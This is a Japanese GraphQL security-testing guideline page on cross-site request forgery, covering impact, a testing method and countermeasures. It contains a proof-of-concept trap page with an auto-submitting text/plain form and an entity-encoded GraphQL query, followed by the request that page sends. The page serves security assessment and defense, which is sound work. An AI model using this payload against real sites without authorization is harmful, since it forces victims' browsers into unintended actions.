---
title: "クロスサイトリクエストフォージェリ"
description: "GraphQL診断ガイドライン"
weight: 4
type: docs
bookToc: false
---

# クロスサイトリクエストフォージェリ

## 概要

GraphQLサーバの実装不備によってクライアントから送信されるリクエストが十分検証できていない場合、クロスサイトリクエストフォージェリ(CSRF)攻撃に対して脆弱になる可能性があります。

## 影響
CSRFが悪用された場合と同様の影響を受けます。GraphQL スキーマで定義されているMutationのような副作用のある処理では、攻撃者によって設置された罠ページを経由することにより被害者の意図しない処理を実行させられます。お問い合わせ機能や、チャットへの投稿、商品購入のような金銭授受に関わる処理など、影響については悪用される機能によって異なります。

## 検証方法

CSRFの検証方法は一般のWebアプリケーションのテスト方法と同様です。
検査対象のアプリケーションとは異なるオリジンの罠ページを用意し、被害者ユーザーの意図にかかわらずリクエストを送信できるかを検証します。

- [Testing for Cross Site Request Forgery](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery)
- [That single GraphQL issue that you keep missing](https://blog.doyensec.com/2021/05/20/graphql-csrf.html)

通常、GraphQLのクエリを送信するリクエストのContent-Typeは「application/json」で定義されます。
サーバの実装不備などによってContent-Typeが正しく検証されず、「application/json」以外も受け入れてしまう挙動の場合、CSRFに対して脆弱になる可能性があります。
一例として、以下のような罠を含んだページを閲覧することでリクエストが送信され、サーバ側で受け入れられるかを検証します。

```html
<body onload="document.forms[0].submit()">
    <form action="https://[TARGET_DOMAIN]/graphql" method="POST" enctype="text/plain">
        <textarea name="&#x71;&#x75;&#x65;&#x72;&#x79;&#x7b;&#x41;&#x6c;&#x6c;&#x42;&#x6f;&#x6f;&#x6b;&#x73;&#x7b;&#x42;&#x6f;&#x6f;&#x6b;&#x73;&#x20;&#x7b;&#x69;&#x64;&#x2c;&#x74;&#x69;&#x74;&#x6c;&#x65;&#x2c;&#x61;&#x75;&#x74;&#x68;&#x6f;&#x72;&#x2c;&#x23;" type="hidden">x
}}}</textarea>
    </form>
</body>
```

この罠サイトは以下のようなリクエストを送信します。
```
POST /graphql HTTP/1.1
Host: [TARGET_DOMAIN]
Content-Length: 48
Origin: http://[ATTACKER_DOMAIN]
Content-Type: text/plain
User-Agent: [UA]
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://[ATTACKER_DOMAIN]
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8
Connection: close

query{AllBooks{Books {id,title,author,#=x
}}}

```

## 対策
対策についても一般のWebアプリケーションの対策方法と同様です。
CSRFトークンやCookieの二重送信などが基本的な対策方法として挙げられますが、先も述べたように、通常GraphQLリクエストのContent-Typeは「application/json」で定義されます。
そのため、GraphQLのようなアプリケーションはAJAXを用いたクライアントアプリケーションとの結び付きが強く、カスタムリクエストヘッダを用いた対策がしばしば提案されます。
カスタムヘッダを設定したリクエストは同一生成元ポリシーによる制限を受けるため、CSRFの対策に有効です。

- [Cross-Site Request Forgery Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)